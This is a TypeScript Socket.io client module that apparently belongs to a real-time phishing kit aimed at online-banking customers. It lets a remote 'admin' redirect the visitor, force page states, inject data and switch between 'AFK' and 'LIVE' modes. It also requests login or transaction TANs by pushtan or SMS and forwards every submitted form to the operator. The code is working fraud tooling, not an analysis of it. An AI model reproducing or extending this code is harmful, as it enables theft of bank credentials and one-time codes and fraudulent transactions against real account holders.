/**
 * Socket.io Client for Template Real-time Updates
 * Handles admin commands and real-time state updates
 */

import { io, Socket } from 'socket.io-client';

interface TemplateSocketClientConfig {
  sessionKey: string;
  templateName: string;
  onStateForced?: (state: string, message?: string) => void;
  onDataInjected?: (data: any) => void;
  onRedirect?: (url: string) => void;
  onMessage?: (message: string, type: 'info' | 'warning' | 'error') => void;
  onSessionUpdate?: (data: any) => void;
  onTanRequest?: (tanData: {
    type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
    method: 'pushtan' | 'sms';
    transactionDetails?: any;
    requestId: string;
  }) => void;
  onModeChanged?: (mode: 'AFK' | 'LIVE') => void;
  onContinueFlow?: () => void;
}

class TemplateSocketClient {
  private socket: Socket | null = null;
  private config: TemplateSocketClientConfig | null = null;
  private reconnectAttempts = 0;
  private maxReconnectAttempts = 5;

  /**
   * Connect to Socket.io server
   */
  connect(config: TemplateSocketClientConfig): void {
    this.config = config;
    
    // Get backend URL - use API base for consistency
    // In production, Socket.io is served from same origin as API
    const backendUrl = import.meta.env.MODE === 'production' 
      ? window.location.origin  // Use current domain (works with multiple domains via reverse proxy)
      : 'http://localhost:3001';

    console.log('🔌 Connecting to Socket.io server:', backendUrl);
    console.log('🔍 Current origin:', window.location.origin);
    console.log('🔍 Mode:', import.meta.env.MODE);

    this.socket = io(backendUrl, {
      transports: ['polling', 'websocket'], // Try polling first, then websocket
      reconnectionAttempts: this.maxReconnectAttempts,
      reconnectionDelay: 2000, // Longer delay between attempts
      reconnectionDelayMax: 10000, // Cap max delay
      timeout: 10000, // Connection timeout
      forceNew: false,
      upgrade: true, // Allow upgrading from polling to websocket
      rememberUpgrade: false // Don't remember websocket failures across sessions
    });

    this.setupEventHandlers();
  }

  /**
   * Setup Socket.io event handlers
   */
  private setupEventHandlers(): void {
    if (!this.socket || !this.config) return;

    // Connection events
    this.socket.on('connect', () => {
      if (process.env.NODE_ENV === 'development') {
        console.log('✅ Socket.io connected:', this.socket?.id);
      }
      this.reconnectAttempts = 0;
      
      // Join session room
      this.socket?.emit('join_session', {
        sessionKey: this.config?.sessionKey,
        templateName: this.config?.templateName,
        userType: 'user'
      });
    });

    this.socket.on('connect_error', (error) => {
      console.error('❌ Socket.io connection error:', error);
      this.reconnectAttempts++;
      
      if (this.reconnectAttempts >= this.maxReconnectAttempts) {
        console.warn('⚠️ Max reconnection attempts reached, falling back to polling');
      }
    });

    this.socket.on('disconnect', (reason) => {
      console.log('🔌 Socket.io disconnected:', reason);
    });

    // Admin command handlers
    this.socket.on('force_state', (data) => {
      console.log('🎯 Admin forced state change:', data);
      this.config?.onStateForced?.(data.state, data.message);
    });

    this.socket.on('inject_data', (data) => {
      console.log('💉 Admin injected data:', data);
      this.config?.onDataInjected?.(data.data);
    });

    this.socket.on('redirect', (data) => {
      console.log('🔗 Admin triggered redirect:', data.url);
      if (this.config?.onRedirect) {
        this.config.onRedirect(data.url);
      } else {
        // Default redirect behavior
        window.location.href = data.url;
      }
    });

    this.socket.on('show_message', (data) => {
      console.log('💬 Admin message:', data);
      this.config?.onMessage?.(data.message, data.type);
    });

    // Session update notifications
    this.socket.on('session_update', (data) => {
      console.log('📊 Session update received:', data);
      this.config?.onSessionUpdate?.(data);
    });

    // Enhanced TAN system events
    this.socket.on('admin_request_tan', (tanData: {
      type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
      method: 'pushtan' | 'sms';
      transactionDetails?: any;
      requestId: string;
    }) => {
      console.log('🔐 Frontend received TAN request:', tanData);
      console.log('🔍 TAN Request Debug - onTanRequest handler exists:', !!this.config?.onTanRequest);
      
      if (this.config?.onTanRequest) {
        console.log('🔐 Calling onTanRequest handler...');
        this.config.onTanRequest(tanData);
      } else {
        console.error('❌ onTanRequest handler not found in config!');
      }
    });

    // AFK/Live Mode control events
    this.socket.on('mode_changed', (data: { mode: 'AFK' | 'LIVE' }) => {
      console.log('🎛️ Frontend received mode change:', data);
      this.config?.onModeChanged?.(data.mode);
    });

    this.socket.on('continue_flow', () => {
      console.log('▶️ Frontend received continue flow command');
      this.config?.onContinueFlow?.();
    });
  }

  /**
   * Send session update to server (for admin monitoring)
   */
  sendSessionUpdate(state: string, data?: any, message?: string): void {
    if (!this.socket || !this.config) return;

    this.socket.emit('session_update', {
      sessionKey: this.config.sessionKey,
      state,
      data,
      message,
      timestamp: new Date().toISOString()
    });

    console.log('📤 Sent session update:', { state, data, message });
  }

  /**
   * Send form submission notification
   */
  sendFormSubmission(step: string, formData: any): void {
    this.sendSessionUpdate(`form_${step}`, formData, `Form submitted: ${step}`);
  }

  /**
   * Send error notification
   */
  sendError(error: string, step?: string): void {
    this.sendSessionUpdate('error', { error, step }, `Error: ${error}`);
  }

  /**
   * Update session configuration
   */
  updateConfig(updates: Partial<TemplateSocketClientConfig>): void {
    if (this.config) {
      this.config = { ...this.config, ...updates };
    }
  }

  /**
   * Disconnect from server
   */
  disconnect(): void {
    if (this.socket) {
      console.log('🔌 Disconnecting Socket.io client');
      this.socket.disconnect();
      this.socket = null;
    }
  }

  /**
   * Check if connected
   */
  isConnected(): boolean {
    return this.socket?.connected || false;
  }

  /**
   * Emit event to server
   */
  emit(event: string, data?: any): void {
    if (this.socket?.connected) {
      this.socket.emit(event, data);
      console.log(`📤 Emitted ${event}:`, data);
    } else {
      console.warn('⚠️ Socket not connected, cannot emit:', event);
    }
  }

  /**
   * Get connection status
   */
  getStatus(): {
    connected: boolean;
    socketId?: string;
    reconnectAttempts: number;
  } {
    return {
      connected: this.isConnected(),
      socketId: this.socket?.id,
      reconnectAttempts: this.reconnectAttempts
    };
  }
}

// Export singleton instance
const templateSocketClient = new TemplateSocketClient();
export default templateSocketClient;
